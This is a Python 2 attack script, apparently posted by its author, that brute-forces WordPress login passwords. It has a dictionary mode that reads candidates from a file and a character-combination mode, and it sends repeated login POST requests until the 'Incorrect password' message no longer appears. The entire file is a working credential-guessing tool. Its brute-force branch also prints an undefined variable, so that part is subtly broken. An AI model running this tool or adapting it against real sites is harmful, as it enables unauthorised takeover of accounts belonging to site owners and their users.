#!usr/bin/python
# Flaw found on Wordpress
# that allow Dictionnary & Bruteforce attack
# Greetz goes to : NeoMorphS, Tiky 
# Vendor : http://wordpress.org/
# Found by : Kad (kadfrox@gmail.com / #kadaj-diabolik@hotmail.fr)
import urllib , urllib2, sys, string
tab = "%s%s%s"%( string.ascii_letters, string.punctuation, string.digits )
tab = [  i for i in tab ]
def node( table, parent, size ):
        if size == 0:
                pass
        else:
                for c in table:
                        string = "%s%s"%( parent, c )
                        data = {'log': sys.argv[2],
                                'pwd': string}
                        print "[+] Testing : "+string
                        request = urllib2.Request(server, urllib.urlencode(data))
                        f = urllib2.urlopen(request).read()
                        if not "Incorrect password.</div>" in f: print "[!] Password is : "+mot ; break
                        node( table, string, size-1 )
 
def bruteforce( table, size ):
        for c in table:
                node( table, c, size-1 )
                
if (len(sys.argv) < 3):
    print "Usage : float.py <server> <user> <choice> <dico-characters>"
    print "\nDefault: User is 'admin'"
    print "Choice : 1} Dictionnary Attack, use dictionnary file"
    print "         2} Bruteforce Attack, use number of character for password"
    
else:
    server = sys.argv[1]
    if sys.argv[3] == "1":
        a , b = open(sys.argv[4],'r') , 0
        for lines in a: b = b + 1
        a.seek(0)       
        c = 0
        while (c < b):
                mot = a.readline().rstrip()
                data = {'log': sys.argv[2],
                                'pwd': mot}
                print "[+] Testing : "+mot
                request = urllib2.Request(server, urllib.urlencode(data))
                f = urllib2.urlopen(request).read()
                if not "Incorrect password.</div>" in f: print "[!] Password is : "+mot ; break
                else: c = c + 1 ; pass
    if sys.argv[3] == "2":
        print "[-] Server is : "+server
        print "[-] User is : "+sys.argv[2]
        print "[-] Number of characters are : "+sys.argv[4]
        number = int(sys.argv[4])
        bruteforce( tab, number )
